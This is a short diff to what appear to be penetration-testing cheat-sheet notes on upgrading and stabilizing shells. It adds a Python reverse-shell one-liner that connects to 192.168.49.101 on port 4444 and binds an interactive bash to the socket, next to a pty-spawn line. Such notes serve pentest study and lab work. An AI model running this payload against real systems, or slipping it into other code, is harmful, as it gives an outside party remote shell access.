@@ -157,6 +157,7 @@ https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/
  
  -https://netsec.ws/?p=337 - interactive tty
  - python3 -c 'import pty;pty.spawn("/bin/bash")'
+ - python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.101",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 
 #### Stabilize shell
 Working inside the reverse shell:
